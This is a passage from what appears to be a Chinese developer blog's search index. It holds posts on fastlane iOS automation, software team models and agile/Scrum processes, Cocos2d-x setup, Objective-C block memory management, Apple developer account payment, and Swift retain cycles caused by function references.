&quot;./customScript.sh&quot;\tSlackend\n\n\n提高版本号\ncocoapods 进行相关pod配置\nxctool 进行编译\nsnapshot 自动生成截图\nsigh 处理 provision profile 相关的事情\ndeliver 上传截图\nframeit 将应用截图快速的放入对应的设备尺寸中\n执行一些自动化的脚本\n把结果发送到 slack\n\n这是一个完成的自动化的过程。不过实际发布过程中，截图那部分笔者所在公司还是自己手动上传了，fastlane基本还是用来自动化打包。\n安装fastlane\n$ gem install fastlane\n\n初始化在项目根目录下，初始化Fastlane:\n$ fastlane init\n\n初始化的过程中会要求填写一些项目信息比如 Apple ID, fastlane 会自动检测当前目录中项目的App Name和App Identifier。如果检测的不对，选择 n 自行输入。同时会在项目中生成一个fastlane的文件夹。\n目录结构fastlane├── Appfile├── Deliverfile├── Fastfile├── metadata│   ├── app_icon.jpg│   ├── copyright.txt│   ├── primary_category.txt│   ├── primary_first_sub_category.txt│   ├── primary_second_sub_category.txt│   ├── review_information│   │   ├── demo_password.txt│   │   ├── demo_user.txt│   │   ├── email_address.txt│   │   ├── first_name.txt│   │   ├── last_name.txt│   │   ├── notes.txt│   │   └── phone_number.txt│   ├── secondary_category.txt│   ├── secondary_first_sub_category.txt│   ├── secondary_second_sub_category.txt│   └── zh-Hans│       ├── description.txt│       ├── keywords.txt│       ├── marketing_url.txt│       ├── name.txt│       ├── privacy_url.txt│       ├── release_notes.txt│       └── support_url.txt└── screenshots    ├── README.txt    └── zh-Hans        ├── 1_iphone6Plus_1.6+ Screenshot 0 iPhone.png        ├── 2_iphone6Plus_2.6+ Screenshot 1 iPhone.png        ├── 3_iphone6Plus_3.6+ Screenshot 4 iPhone.png        ├── 4_iphone6Plus_4.6+ Screenshot 2 iPhone.png        └── 5_iphone6Plus_5.6+ Screenshot 3 iPhone.png\n\n\n上面这些文件中，最重要的两个文件就是Appfile和Fastfile。\nAppfile 里面存放了App的基本信息包括app_identifier、apple_id、team_id。如果在init的时候你输入了正确的appId账号和密码会在这里生成正确的team_id信息。如果没有team，这里就不会显示。\nFastfile是最重要的一个文件，在这个文件里面可以编写和定制我们打包脚本的一个文件，所有自定义的功能都写在这里。\n如果在init的时候选择了在iTunes Connect创建App，那么fastlane会调用produce进行初始化，如果现在还不想创建，也可以之后再运行produce init进行这个流程。如果不执行produce的流程，deliver的流程不会被执行，当然之后也可以deliver init运行完全一样的流程。\n在iTunes Connect 中成功创建App之后，fastlane的文件夹里面就有Deliverfile文件了。\nDeliverfile文件里面主要是deliver的配置文件和Deliverfile的一些帮助。\n","categories":["iOS"],"tags":["Xcode"]},{"title":"软件团队模式和开发流程","url":"/2017/02/22/Team-Mode-Development-Process/","content":"软件团队的模式主治医师模式（Chief Programmer Team，Surgical Team）就像在手术台上那样，有一个主刀医师，其他人（麻醉，护士，器械）各司其职，为主刀医师服务。\n这样的软件团队中，有首席程序员（Chief Programmer），他&#x2F;她负责处理主要模块的设计和编码，其他成员从各种角度支持他&#x2F;她的工作（后备程序员、系统管理员、工具开发、编程语言专家、业务专家）。\n在一些学校里，软件工程的团队模式往往从这一模式退化为『一个学生干活，其余学生跟着打酱油』。\n明星模式（Super-star Model）主治医师模式运用到极点，可以蜕化为明星模式，在这里，明星的光芒盖过了团队其他人的总和。明星也是人，也会受伤，犯错误，如何让团队的利益最大化，而不是明星的利益最大化？如何让团队的价值在明星陨落之后任然能够保持？是这个模式要解决的问题。\n社区模式（Community Model）社区由很多志愿者参与，每个人参与自己感兴趣的项目，贡献力量，大部分人不拿报酬。这种模式的好处是『众人拾柴火焰高』，但是如果大家都只来烤火，不去拾柴；或者捡到的柴火质量太差，最后火也就熄灭了。『社区』并不意味着『随意』，一些成功社区项目（例如开发和维护Linux操作系统的社区），都有很严格的代码复审和签入的质量控制。\n业余剧团模式（Amateur Theater Team）这样的团队在每一个项目中，不同的人会挑选不同的角色。在下一个项目中，这些人也许会换一个完全不同的角色类型。各人在团队中听从一个中央指挥（导演）的指导和安排。在学生实践项目或培训项目中，这样的事情经常发生。\n秘密团队（Skunk Work Team）一些软件项目在秘密状态下进行，别人不知道他们具体在做什么。这种模式的好处是：团队内部有极大的自由，没有外界的干扰（不用每周给别人介绍项目进展，听领导的最新指示，等等），团队成员有极大的投入。\n特工团队（SWAT）软件行业的一些团队由一些有特殊技能的专业人士组成，负责解决一些棘手而有紧迫性的问题。\n交响乐团模式（Orchestra）想象一下交响乐团的演奏，有下面的特点。\n\n家伙多，门类齐全。\n各司其职，各自有专门场地，演奏期间没有聊天、走动等现象。\n演奏都靠谱，同时看指挥的。\n演奏的都是练习过多次的曲目，重在执行。\n\n当某个软件领域处于稳定成长阶段的时候，众多大型软件公司的开发团队就会才去这种模式。\n爵士乐模式（Jazz Band）和交响乐团相比，这种模式有以下特点。\n\n不靠谱。他们演奏时都没有谱子。\n没有现场指挥，平时有编曲起到协调和指导作用。\n也有模式，架构师先吹出主题，然后他走到一旁抽烟去了，其余人员根据这个主题各自即兴发挥，最后迈尔斯加入，回应主题，像是对曲子的总结。\n人数较少。\n\n功能团队模式（Feature Team）很多软件公式的团队最后都演变成功能团队，简而言之，就是具备不同能力的同事们平等协作，共同完成一个功能。\n在这个功能完成之后，这些人又重新组织，和别的角色一起去完成下一个功能。他们之间没有管理和被管理的关系。大型软件公司里的不少团队都是采用这种模式。这些功能小组也称为Feature Crew，小组内的交流比较频繁。\n每个小组都由一到三个人组成，每个小组都是一个有自主权的单元，可以自由选用最有利于他们完成工作的任何技术。但是，每个小组必须与其他小组就编码规范达成一致。\n官僚模式（Bureaucratic Model）这种模式脱胎于大机构的组织架构，几个人报告给一个小头目，几个小头目报告给中头目，依次而上。这种模式在软件开发中会出问题。因为成员之间不光有技术方面的合作和领导，同时还混进了组织上的领导和被领导关系。跨组织的合作变得比较困难，因为各自头顶上都有不同的老板。\n这种模式如果应用不好，最后会变成『老板驱动』的开发流程。\n\n\n开发流程写了再改模式（Code-and-Fix）这个流程不需要太多其他准备或相关知识，大家上来就写代码，也许就能写出来，写不出来就改，也许能改好。当面临下面的任务时，也许这个方法是有用的。\n\n『只用一次』的程序\n『看过了就扔』的原型\n一些不实用的演示程序\n\n瀑布模型（Waterfall Model）\n\n\nRational Unified Process统一流程（RUP）RUP 把软件开发的各个阶段整合在一个统一的框架里。\n要完成一个复杂的软件项目，团队的各种成员要在不同阶段做不同的事情，这些不同类型的工作在 RUP 中叫做规程（Discipline）或者工作流（Workflow）。\n业务建模为用户提供软件，就要理解目前用户的业务流程，但是精通计算机语言细节的工程师并不能马上理解对用户活动和期望值的各种自然语言描述。为了解决这个问题，业务建模（Business Modeling）工作流用精确的语言（通常是UML）把用户的活动描述出来。这个工作流的结果通常是用例（Use Case）。\n需求有了用例之后，开发人员和用户要分析并确认软件系统得提供什么样的功能来满足用户的需求，功能有什么约束条件，如何验证功能满足了用户需求。这就是需求（Requirement）工作流的作用。\n分析和设计分析和设计（Analysis &amp; Design）工作流将需求转换成系统的设计。这一步结束之后，团队成员就能知道系统有哪些子系统、模块，他们之间的关系是怎样的。\n实现在实现（Implementation）工作流中，工程师按照计划实现上一步产出的设计，将开发出的组件（Module），连同验证模块（例如：单元测试）提交到系统中。同时，工程师们集成由单个开发者（或小组）所产生的结果，通过手工或自动化的手段，把可执行的系统搭建出来。\n测试测试（Test）工作流要验证现阶段交付的所有组件的正确性、组件之间交互的正确性，以及检验所有的需求已被正确地实现。在这个工程中，发现、报告、会诊、修复各种缺陷，在软件部署之前保证质量达到预期要求。\n部署部署（Deployment）工作流的目的是生成最终版本并将软件分发给最终用户。\n配置和变更管理配置和变更管理工作流（Configuration and Change Management）负责管理 RUP 各个阶段产生的各种工作结果（例如源代码控制系统管理和备份各种源文件），要记录修改人员、修改原因、修改时间等属性，有些团队还可以考虑并行开发、分布式开发等。\n项目管理软件项目管理工作流（Project Management）平衡各种可能产生冲突的目标，管理风险，克服各种约束并成功地在各个阶段交付达到要求的产品。\n环境环境（Environment）工作流的目的是向软件开发组织提供软件开发环境，包括工程和工具。\nRUP 把软件开发分成几个阶段，一个大阶段的结束称为一个里程碑（Milestone），每个阶段内可以有几个迭代，以比较灵活的形式实现本阶段的任务。从这一点来说，RUP在大尺度上像瀑布模型，在每个阶段内像迭代模型。\n四个阶段：\n初始阶段——此阶段的目标是分析软件系统大概的构成，系统与外部系统的边界在哪里（我们的系统究竟和什么别的外部实体打交道），大致的成本和预算是多少，系统的风险主要来自哪里，成功度过初始阶段的项目会达到生命周期目标（Lifecycle Objective）里程碑。\n细化阶段——它的目标是分析问题领域，建立健全的体系结构基础，编制目标计划，按优先级处理项目中的风险。团队要确定项目的具体范围、主要功能、性能、安全性、可扩展性等非功能需求。同时为项目建立支持环境，包括创建开发案例、创建模板并准备工具。细化阶段结束时，项目达到了第二个重要的里程碑：生命周期结构（Lifecycle Architecture）里程碑。\n构造阶段——在这一阶段，团队开发出所有的功能集，并有秩序地把功能集成为经过各种测试验证过的产品。构造阶段结束时是第三个重要的里程碑：初始功能（Initial Operational）里程碑。此时的产品版本也常被称为『beta』版。\n交付阶段——这时候，团队工作的重点是确保软件能满足最终用户的实际需求。交付阶段可以有迭代（beta1，beta2等），团队还要注意处理用户设置、安装和可用性等问题。在交付阶段的终点是第四个里程碑：产品发布（Product Release）里程碑。\n\n渐进交付的流程（Evolutionary Delivery），MVP 和 MBP当系统的主要需求和架构明确之后，软件团队进入了一个不断演进的 evolution 循环中：\n\nMVP —— Minimal Viable Product，最小可行产品，又称为Minimal Feature Set，最小功能集。\n具体的做法是：把产品最核心的功能用最小的成本实现出来（或者描绘出来），然后快速征求用户意见。例如：一个社交网站已经有很多用户，都是免费的，产品团队想设计一个付费的VIP服务，MVP的做法可以是这样——在目前的用户入口页面中加一个『VIP服务』的链接，指向一个简单的介绍页面。观察到底有多少用户点击这个链接。如果点击量太小，那么这个VIP服务就不用做了。\nMVP的指导思想和渐进交付相似，但是它更强调更早获得用户反馈，为此可以在产品完成之前就发布，它也强调产品的核心价值（产品最区别与竞争产品的地方），为了突出核心功能，别的辅助功能可以不考虑或者用别的平台提供的服务来代替。\nMBP —— Maximal Beautiful Product（最强最美产品）。如果对用户的需求了然于心，或者产品团队比用户更了解用户的需求，为何不把产品最全、最美的形态展现出来，一举征服用户。\n敏捷流程现有的做法 VS. 敏捷的做法\n\n\n\n现有的做法\n敏捷的做法\n\n\n\n流程和工具\n个人和交流\n\n\n完备的文档\n可用的软件\n\n\n为合同谈判\n与客户合作\n\n\n执行原定计划\n响应变化\n\n\n敏捷软件开发宣言\n我们一直在实践中探寻更好的软件开发方法，身体力行的同时也帮助他人。由此我们建立了如下价值观：个体和互动 高于 流程和工具工作的软件 高于 详尽的文档客户合作 高于 合同谈判响应变化 高于 遵循计划也就是说，尽管右项有其价值，我们更重视左项的价值。\n\n敏捷开发原则\n尽早并持续地交付有价值的软件以满足顾客需求\n敏捷流程欢迎需求的变化，并利用这种变化来提高用户的竞争优势\n经常发布可用的软件，发布间隔可以从几周到几个月，能短则短\n业务人员和开发人员在项目开发过程中应该每天共同工作\n以有进取心的人为项目核心，充分支持信任他们\n无论团队内外，面对面的交流始终最有效的沟通方式\n可用的软件是衡量项目进展的主要指标\n敏捷流程应能保持可持续的发展。领导、团队和用户应该能按照目前的步调持续合作下去\n只有不断关注技术和设计，才能越来越敏捷\n保持简明——尽可能简化工作量的技艺——极为重要\n只有能自我管理的团队才能创建优秀的架构、需求和设计\n时时总结如何提高团队效率，并付诸行动\n\nScrum 方法论第一步：找出完成产品需要做的事情——Product BacklogBacklog 翻译成『积压的工作』、『待解决的问题』、『产品订单』，都可以。产品负责人主导大家对于这个 Backlog 进行增&#x2F;删&#x2F;改的工作。每一项工作的时间估计单位为『天』。\n第二步：决定当前的冲刺（Sprint）需要解决的事情——Sprint Backlog。整个产品的实现被划分为几个相互联系的冲刺（Sprint）。产品订单上的任务被进一步细化了，被分解为以小时为单位。如果一个任务的估计时间太长（如超过16个小时），那么它就应该被进一步分解。订单上的任务是团队成员根据自己的情况来认领。团队成员能主导任务的估计和分配，他们的能动性得到较大的发挥。\n第三步：冲刺（Sprint）在冲刺阶段，外部人士不能直接打扰团队成员。一切交流只能通过 Scrum 大师（Scrum Master）来完成。这一措施较好地平衡了『交流』和『集中注意力』的矛盾。有任何需求的改变都留待冲刺结束后再讨论。\n冲刺期间，每天要开一个每日例会（Scrum Meeting），团队成员大多站着开会，所以又称每日立会。大家依次报告：\t\t我昨天做了啥\t我今天要做啥\t我碰到了哪些问题\t每日立会强迫每个人向同伴报告进度，迫使大家把问题摆在明面上。同时启动每日构建，让大家每天都能看到一个逐渐完善的版本。\n用简明的图表展现整个项目的进度，这个图最好放在大家工作的环境中，或者每天传达给各个成员。\n也可以是简单的看板图：把一堆任务从最初的『待定』推动到『工作中』等各个状态，直至『完成』。\n冲刺阶段是时间驱动的（Time-boxed），时间一到就结束。这个特点看似不起眼，但其实它有效地断了各种延期想法的后路，很高明。\n第四步：得到软件的一个增量版本，发布给用户。然后在此基础上又进一步计划增量的新功能和改进。敏捷总结敏捷对团队的要求很简单：自主管理（Self-managing）、自我组织（Self-organizing）、多功能型（Cross-functional），但是这很难做到。\n与质量控制理论的模型如经典的戴明环（Plan-Do-Check-Act&#x2F;Adjust，PDCA）类似。\nScrum 核心特点：\n\n在迭代开始时，团队审视摆在他们面前的任务，选择他们认为可以在迭代期间完成的那些任务（Plan）。然后团队独立地尽最大努力完成这些任务（Do）。在迭代结束时，团队给利益关系人展示成果（Check），并对开发流程进行调整（Act&#x2F;Adjust）。\n\nSprint&#x2F;Scrum 对项目的众多需求采取分而治之的办法，能让相关人员集中精力，在一定期限内解决部分问题。它强调短时间的迭代（Iteration、Timebox），在多次迭代中不断总结，改进团队的流程和产品功能。他明确地指出不同的人在一个项目中的投入和责任的不同，并坚持让全身心投入的『猪』来主导项目。它通过Daily Scrum、Scrum Master等方法和角色，鼓励团队内部交流，并优化团队和其他人员的交流方式。它对团队成员提出了很高的要求：自主管理、自我组织、多功能型。一般人不能马上做到这一点。它不是『银弹』，不能解决软件开发的所有问题。至于具体项目进度如何跟踪，如何管理测试工作，如何管理复杂项目，还是靠战斗在一线的团队成员见招拆招，想出合适的办法。\n敏捷流程的经验教训\n敏捷宣言表明的是一些优先级，不必当作圣旨或者教条来争论。\nScrum Master 不是一个官，而是一个没有行政权力的沟通者，就像微软的PM那样。他&#x2F;她同时还要在团队中做具体的工作。直接把原来的『经理』变成 Scrum Master，大多行不通。\n一些项目需要很多暗箱操作和政治角力才能搞定，Scrum 会把这些矛盾都摆在明处。这有好处，也有风险。\n在复杂的项目里，要让一线团队成员做决定。\n创业公司的团队其实经常是运行在 Scrum 模式中。\n在 Scrum 计划阶段的估计不是一个『合同』，领导们不要把它当成一个合同。估计总是不准的。坚持短期的Sprint，这样即使不准的估计也不会有大的损害。\n不要和管理层谈『流程』，他们只关心『结果』。\n在大型团队、跨地区的团队，或者复杂项目中，Scrum 并没有非常完美的答案，Scrum的创始人也承认这一点。\n\n","categories":["软件设计"],"tags":["开发流程","团队模式"]},{"title":"OS X Cocos2d-x 环境搭建","url":"/2017/02/23/Cocos2d-x-Install/","content":"Cocos2d-x 引擎Cocos2d-x引擎可在 Cocos官网下载，其下载地址为：http://www.cocos.com/download/。当然，亦可从Cocos2d-x的 GitHub 仓库拉取，仓库地址：https://github.com/cocos2d/cocos2d-x。下载完成后，引擎包的主要内容下。\n\nAUTHORS：作者目录，包含所有给Cocos2d-x引擎贡献代码的开发者\nbuild：包含测试例子、cocos2d_lib的Xcode以及Visual Studio工程\nCHANGELOG：所有历史版本详细改动列表\nCMakeLists.txt：cmake配置文件\ncocos：Cocos2d-x引擎源代码\nCONTRIBUTING.md：贡献代码指南\ndocs：包含JavaScript代码风格规范、当前发布说明和当前版本升级指南\ndownload-deps.py：下载第三方库的脚本\nextensions：第三方扩展\nexternal：存放第三方库的文件夹\nlicenses：所有许可协议\nplugin：插件\nREADME.cmake：针对cmake用法的说明文件\nREADME.md：Cocos2d-x引擎简介\nsetup.py：Cocos Console的安装脚本\ntemplates：Cocos Console创建项目时使用的模板\ntests：各分支的测试项目\ntools：工具文件夹\n—bindings-generator：脚本绑定工具\n—cocos2d-console：Cocos Console工具\n—tojs：JSB自动绑定配置文件以及生成脚本\n—tolua：Lua绑定配置文件以及生成脚本\nweb：Cocos2d-JS游戏引擎\n\n\n\nCocos ConsoleCocos Console 是 Cocos2d-x 引擎下的一个命令行工具，它用来管理 Cocos 工程，其中包含创建、运行、编译、调试以及打包项目等。\nCocos Console 位于引擎包 cocos2d-x&#x2F;tools&#x2F;cocos2d-console 目录下，通过运行引擎包目录下的 setup.py 脚本即可安装。在安装的过程中，Cocos Console 需要开发者提供 Android NDK、Android SDK 和 Apache ANT 的文件路径。另外，Cocos Console 是一个采用 Python 语言编写的跨平台脚本工具，所以在安装Cocos Console 之前，需要先安装好Python。\n安装 Python在 Mac OS X 中，操作系统本身自带了 Python，而在 Windows 操作系统中，Python 则需要我们自行下载并安装，其下载地址为：https://www.python.org/downloads/index.html。若你的Mac OS X系统中没有Python，也可通过此地址下载安装。下载至Mac OS X和Windows上的安装包分别是一个.pkg或者.msi文件。\n打开终端，输入 python --version。若提示 Python 版本号，则说明 Python 安装成功。\nAndroid 环境配置当安装好 Python 之后，你便可以开始准备 Android 相关的软件包了。当然，若你不需要支持 Android，除了 Apache Ant 之外，其余步骤可以跳过，不必配置。\n\nApache Ant：将软件编译、测试、部署等步骤联系在一起加以自动化的一个工具，大多用于Java环境中的软件开发。下载地址：http://ant.apache.org/bindownload.cgi。\nAndroid SDK：即Software Development Kit的简称，中文译为软件开发工具包。在Android 中，它为开发者提供了库文件以及其他开发所用到的工具。下载地址：&lt;http://developer.android.com/ tools&#x2F;sdk&#x2F;ndk&#x2F;index.html&gt;。\nAndroid NDK：即Native Development Kit的简称，它是一系列工具的集合，可以帮助开发 者快速开发C&#x2F;C++的动态库。另外，它还能自动将.so文件和Java应用一起打包成.apk。下 载地址：https://developer.android.com/sdk/index.html?hl=sk。\nJDK：Java的开发工具包，包括Java运行环境、Java工具和Java基础类库。下载地址：https://www.oracle.com/downloads/index.html。\n\n安装 Cocos Console打开终端，进入 Cocos2d-x 引擎目录下，然后再运行setup.py脚本，相关命令如下：\n$ cd /Users/Chaosky/Cocos/cocos2d-x-3.14.1$ python setup.py\n\n然后根据提示，将Cocos Console所需的文件路径拖曳进去，最后根据末尾行提示进行对应的操作。\n此时，Cocos Console安装成功。若要卸载Cocos Console，则Mac OS X用户可删除 /Users/用户名/下.bash_profile或者.zshrc 文件中对应的值，而Windows用户只需删除对应的系统环境变量值即可。\n创建、编译和运行工程在终端中执行 cocos --help，查看 cocos 命令行工具集的功能。\n$ cocos --help可用的命令：\trun              在设备或者模拟器上编译，部署和运行工程。\tgen-libs         生成引擎的预编译库。生成的库文件会保存在引擎根目录的 &#x27;prebuilt&#x27; 文件夹。\tluacompile       对 lua 文件进行加密和编译为字节码的处理。\tdeploy           编译并在设备或模拟器上部署工程。\tpackage          管理 cocos 中的 package。\tcompile          编译并打包工程。\tgen-simulator    生成 Cocos 模拟器。\tnew              创建一个新的工程。\tjscompile        对 js 文件进行加密和压缩处理。\tgen-templates    生成用于 Cocos Framework 环境的模板。可用的参数：\t-h, --help\t\t\t显示帮助信息。\t-v, --version\t\t\t显示命令行工具的版本号。\t--ol [&#x27;en&#x27;, &#x27;zh&#x27;, &#x27;zh_tr&#x27;]\t指定输出信息的语言。示例：\tcocos new --help\tcocos run --help\n\n创建终端中输入cocos new --help查看功能。\n$ cocos new --helpusage: cocos new [-h] [-p PACKAGE_NAME] [-d DIRECTORY] [-t TEMPLATE_NAME]                 [--ios-bundleid IOS_BUNDLEID] [--mac-bundleid MAC_BUNDLEID]                 [-e ENGINE_PATH] [--portrait] [--no-native] -l &#123;cpp,lua,js&#125;                 [PROJECT_NAME]创建一个新的工程。positional arguments:  PROJECT_NAME          设置工程名称。optional arguments:  -h, --help            show this help message and exit  -p PACKAGE_NAME, --package PACKAGE_NAME                        设置工程的包名。  -d DIRECTORY, --directory DIRECTORY                        设置工程存放路径。  -t TEMPLATE_NAME, --template TEMPLATE_NAME                        设置使用的模板名称。  --ios-bundleid IOS_BUNDLEID                        设置工程的 iOS Bundle ID。  --mac-bundleid MAC_BUNDLEID                        设置工程的 Mac Bundle ID。  -e ENGINE_PATH, --engine-path ENGINE_PATH                        设置引擎路径。  --portrait            设置工程为竖屏。  -l &#123;cpp,lua,js&#125;, --language &#123;cpp,lua,js&#125;                        设置工程使用的编程语言，可选值：[cpp |                        lua | js]lua/js 工程可用参数:  --no-native           设置新建的工程不包含 C++                        代码与各平台工程。\n\n具体有几种方式：\n\n创建一个名为projectName，并同时包含Cocos2d-HTML5和Cocos2d-x JSB项目\n cocos new projectName -l js\n\n创建一个名为projectName，且仅含Cocos2d-HTML5的项目， –no-native表示不需要支持Native平 台（iOS、Android、Mac、Windows等），仅支持浏览器即可\n cocos new projectName -l js --no-native\n\n在桌面上创建一个名为projectName的项目\n cocos new projectName -l js -d ./Desktop\n\n在桌面上创建一个名为projectName的项目，并设置为竖屏\n cocos new projectName -l js -d ./Desktop --portrait\n\n 其中 -l 表示采用的语言，可选值为 cpp、lua以及js。\n编译、部署、运行当项目创建完毕后，可以通过下列命令将项目运行在浏览器中：\ncd ./Desktop/HelloWorld cocos run -p web\n\n除创建命令外，Cocos Console还为工程提供了运行、编译等命令，具体如下：\n// 运行在指定的平台上cocos run -p web|ios|android|mac|win32// 将项目工程打包到指定的平台上cocos compile -p web|ios|android|mac|win32 -m release\n\nCocos Console提供了相关的help指令，方便开发者查询Cocos Console相关的指令。下面举几个 help指令的例子，其中help可用字母h替代：\ncocos new --helpcocos run --helpcocos compile --help\n","categories":["游戏开发"],"tags":["Cocos2d-x"]},{"title":"Objective-C Block 分析","url":"/2017/08/31/Objective-C-Block/","content":"分析工具：clangclang -rewrite-objc test.m// UIKitclang -x objective-c -rewrite-objc -isysroot /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator.sdk xxxxx.m\n\nblock 的数据结构定义\n对应的结构体定义如下：\nstruct Block_descriptor &#123;    unsigned long int reserved;    unsigned long int size;    void (*copy)(void *dst, void *src);    void (*dispose)(void *);&#125;;struct Block_layout &#123;    void *isa;    int flags;    int reserved;    void (*invoke)(void *, ...);    struct Block_descriptor *descriptor;    /* Imported variables. */&#125;;\n\nblock 的三种类型\n_NSConcreteGlobalBlock 全局的静态 block，不会访问任何外部变量。\n_NSConcreteStackBlock 保存在栈中的 block，当函数返回时会被销毁。\n_NSConcreteMallocBlock 保存在堆中的 block，当引用计数为 0 时会被销毁。\n\n\nblock对变量的捕获规则：\n\n静态存储区的变量：例如全局变量、方法中的static变量 引用，可修改。\n\nblock接受的参数 传值，可修改，和一般函数的参数相同。\n\n栈变量 (被捕获的上下文变量) const，不可修改。 当block被copy后，block会对 id类型的变量产生强引用。 每次执行block时,捕获到的变量都是最初的值。\n\n栈变量 (有__block前缀) 引用，可以修改。如果时id类型则不会被block retain,必须手动处理其内存管理。 如果该类型是C类型变量，block被copy到heap后,该值也会被挪动到heap\n\n\n变量的复制对于 block 外的变量引用，block 默认是将其复制到其数据结构中来实现访问的。\n\n对于用 __block 修饰的外部变量引用，block 是复制其引用地址来实现访问的。\n\n嵌套block- (void)setUpModel&#123;    XYModel *model = [XYModel new];    __weak typeof(self) weakSelf = self;    model.dataChanged = ^(NSString *title) &#123;        __strong typeof(self) strongSelf = weakSelf;        strongSelf.titleLabel.text = title;        __weak typeof(self) weakSelf2 = strongSelf;        strongSelf.model.dataChanged = ^(NSString *title2) &#123;            __strong typeof(self) strongSelf2 = weakSelf2;            strongSelf2.titleLabel.text = title2;        &#125;;    &#125;;    self.model = model;&#125;\n\n这样，就避免的引用循环，总结一下，不管都多少个block嵌套，皆按此法\n@weakify, @strongify 使用\n\n\nweakify(self)展开后是: **weak typeof(self) **weak_self &#x3D; self;\n\nstrongify(self)展开后是：**strong typeof(self) self &#x3D; **weak_self;\n\n在block中使用strongify(self);的目的是确保在block作用域内self不会被其它线程释放掉\n\n以前我们在block中直接使用__weak_self来解除循环引用。这本身没有问题，之所以还要加strongify(self)就是为了避免block中代码执行过程中由于其它线程释放了self导致block内执行的逻辑出现问题。例如：会出现执行前几句代码时访问self还是存在的，但后面的self调用已经变为nil了\n\n如果是在block外部定义strongify(self)虽然在block中的self还是指向(跳转到定义)这个strongify(self)。但因为方法调用结束后strongify(self)定义的局部self变量被释放了，所以这种做法就回退到了[4]\n\n由5可知，如果block中有多个嵌套的block异步调用，那么每一个block中都要再定义一个strongify(self);\n\n虽然在多层嵌套的block中，定义weakify(self)也是可行的。但是不推荐这么做\n\nswift中使用unowned和weak来解决循环引用问题，基本原理同OC。但unowned本质上是__unsafe_unretained即assign，所以使用起来要小心野指针。还是推荐无脑用weak\n\n不过要达到[3]中的效果，就要在当前closure的作用域内retain下self，只不过有个小麻烦是没法像OC中写的那么自然——不能使用self了。例子如下：\nobj.doSomething &#123;[weak self] in  if let strong_self = self &#123;      strong_self.Member_XXX  &#125;&#125;\n\n总结：多层嵌套的block，只需要对最外层block传入的self进行weak化即可。\n参考文章\n谈Objective-C block的实现\n block没那么难（一）：block的实现\n block没那么难（二）：block和变量的内存管理\n block没那么难（三）：block和对象的内存管理\n深入研究Block捕获外部变量和__block实现原理\n深入研究Block用weakSelf、strongSelf、@weakify、@strongify解决循环引用\niOS 中的 block 是如何持有对象的\nobjc 中的 block\niOS开发之block终极篇\niOS Block用法和实现原理\nOC高级编程——深入block，如何捕获变量，如何存储在堆上\nA look inside blocks: Episode 1\nA look inside blocks: Episode 2\nA look inside blocks: Episode 3\n对 Objective-C 中 Block 的追探\nLLVM 中 block 实现源码\nobjective-c-blocks-quiz\nWhich Clang Warning Is Generating This Message?\niOS 内存泄漏分析\n\n","categories":["iOS"],"tags":["Block"]},{"title":"苹果开发者账号申请或续费","url":"/2019/12/17/Apple-Developer-Program/","content":"尝试支付使用国际信用卡（Master或Visa）务必保证账单地址正确，否则会导致支付失败。\n我使用的是招行的Visa信用卡，账单地址可以从招行的掌上生活 App 搜索账单地址可以找到。\n无法支付或支付失败\n周一到周五，早上9点到下午5点。\n\n登录开发者中心，左侧，Contact Us，选择会员资格与帐户—&gt;计划购买和续订。\n\n填电话号码，苹果客服会打电话给你。\n\n接通10秒左右按1与技术顾问交谈，你就跟客服说，无法支付年费，让他们给解决的方法。\n\n他们一般会让你先多尝试，你要先做一些支付失败的记录。\n\n然后跟他们说，确实无法支付，他们就会给你两种方案其中一种，不一定是哪一种。\n\n第一种是直接信用卡划扣，他们会问你有没有国际信用卡，Master或Visa的。\n然后要你给卡号，过期时间，还有账单地址，给你尝试手动划扣99美金，扣成功的话，就直接成功了。\n\n第二种是让你电汇到苹果公司的账号。他们会手动帮你生成一个订单，然后要转账99美金到他们苹果美国的银行账号里。然后转账附言上订单号。可以使用建行，我是用这个解决的，要有U盾。先购汇99美金，大概690+人民币，然后电汇需要手续费20+80，就是100块手续费。大概就是800左右了。电汇成功后回复邮件告诉他们已经电汇了，就行了，一般隔日账号就通过了。\n\n以上。\n\n\n链接\n苹果开发者中心联系电话：https://developer.apple.com/contact/phone/cn/\n\n","categories":["iOS"],"tags":["开发者账号"]},{"title":"Swift 中函数的引用以及导致的循环引用场景","url":"/2020/05/01/Function-references-in-Swift-and-retain-cycles/","content":"Swift 的函数作为一等公民，可以赋值给变量，柯里化，也可以作为参数传递（如果将函数作为参数传递给闭包，只要类型匹配，就可以将函数引用代替内联闭包）。我们可以将函数当作带有名称的特殊闭包，但是使用的时候需要当心。\n0x01 问题最近遇到一个在 Swift 中将函数作为参数传递给闭包时，导致循环引用的场景。\nclass ClassA &#123;        var commandHandler: () -&gt; Void = &#123; &#125;        init() &#123;        print(&quot;init ClassA&quot;)    &#125;        deinit &#123;        print(&quot;deinit ClassA&quot;)    &#125;        func handle(commandHandler: @escaping () -&gt; Void) &#123;        self.commandHandler = commandHandler    &#125;&#125;class ClassB &#123;    let a: ClassA    init(a: ClassA) &#123;        print(&quot;init ClassB&quot;)        self.a = a        a.handle(commandHandler: self.commandAction)    &#125;        deinit &#123;        print(&quot;deinit ClassB&quot;)    &#125;        func commandAction() &#123;            &#125;&#125;\n\n实例化ClassB，这个时候就会产生循环引用导致内存泄漏。\n0x02 实例函数是柯里化类函数在Swift中，实例函数只是柯里化类函数，该类函数将实例作为第一个参数，并隐式地使第一个参数作为self可供函数体使用。 因此，以下两个是等价的：\nlet numbers = [1, 2, 3, 4, 5, 6, 7, 8]numbers.contains(3) //trueArray.contains(numbers)(3) //true\n\n而且，这些也是等价的：\nlet handler1 = self.commandActionlet handler2 = self.dynamicType.commandAction(self)let handler3 = &#123; [unowned self] in self.commandAction() &#125;\n\n0x03 可以通过泛型函数来管理内存如果我们要从上面的 handler2 中获取 self.dynamicType.commandAction，但是没有参数 (self)作为参数传递给了包装函数以便引用 self，我们改怎么办呢？ 我们可以通过unowend来引用，并将 unowned 实例引用传递给类函数获取一个实例函数，而且不会导致循环引用。\nfunc unown&lt;T: AnyObject, V&gt;(_ instance: T, _ classFunction: @escaping (T) -&gt; (() -&gt; V)) -&gt; () -&gt; V &#123;    return &#123; [unowned instance] in classFunction(instance)() &#125;&#125;func unown&lt;T: AnyObject, U, V&gt;(_ instance: T, _ classFunction: @escaping (T) -&gt; ((U) -&gt; V)) -&gt; (U) -&gt; V &#123;    return &#123; [unowned instance] in classFunction(instance)($0) &#125;&#125;\n\n这样的话，我们就可以通过以下方式来获取实例方法的引用，而且我们不会强引用self。\nlet handler4 = unown(self, 